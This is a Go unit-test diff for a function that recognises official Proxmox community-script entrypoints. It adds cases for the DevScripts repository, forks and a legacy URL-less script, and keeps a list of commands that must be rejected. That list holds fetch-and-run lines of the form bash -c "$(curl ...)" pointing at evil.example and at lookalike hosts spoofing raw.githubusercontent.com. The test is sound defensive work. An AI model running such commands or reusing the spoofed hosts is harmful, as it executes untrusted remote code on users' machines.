@@ -93,6 +93,21 @@ _cs_helper="$(curl -fsSL --connect-timeout 10 "${COMMUNITY_SCRIPTS_CORE_URL}/mis
 	if r, n := communityScript(w(generated)); r+"/"+n != "ProxmoxVE/bentopdf" {
 		t.Errorf("generated entrypoint: got %s/%s", r, n)
 	}
+	dev := strings.Replace(generated, "/ProxmoxVE/main", "/DevScripts/main", 1)
+	if r, n := communityScript(w(dev)); r+"/"+n != "DevScripts/bentopdf" {
+		t.Errorf("entrypoint on DevScripts: got %s/%s", r, n)
+	}
+	fork := strings.Replace(generated, "community-scripts/ProxmoxVE", "someone-else/ProxmoxVE", 1)
+	if r, n := communityScript(w(fork)); n != "" {
+		t.Errorf("entrypoint on a fork: got %s/%s", r, n)
+	}
+	legacy := strings.Replace(generated, "export COMMUNITY_SCRIPTS_URL=\"https://raw.githubusercontent.com/community-scripts/ProxmoxVE/main\"\n", "", 1)
+	if legacy == generated {
+		t.Fatal("test entrypoint still names its URL")
+	}
+	if r, n := communityScript(w(legacy)); r+"/"+n != "ProxmoxVE/bentopdf" {
+		t.Errorf("entrypoint without a URL: got %s/%s", r, n)
+	}
 	for _, other := range []string{`apt-get update`, `bash -c "$(curl -fsSL https://evil.example/ct/x.sh)"`, `bash -c "$(curl https://raw.githubusercontent.com/someone-else/ProxmoxVE/main/ct/x.sh)"`, `bash -c "$(curl https://evil.example/raw.githubusercontent.com/community-scripts/ProxmoxVE/main/ct/x.sh)"`, `bash -c "$(curl https://raw.githubusercontent.com.evil.example/community-scripts/ProxmoxVE/main/ct/x.sh)"`} {
 		if n := communityScriptName(w(other)); n != "" {
 			t.Errorf("%q gave %q", other, n)
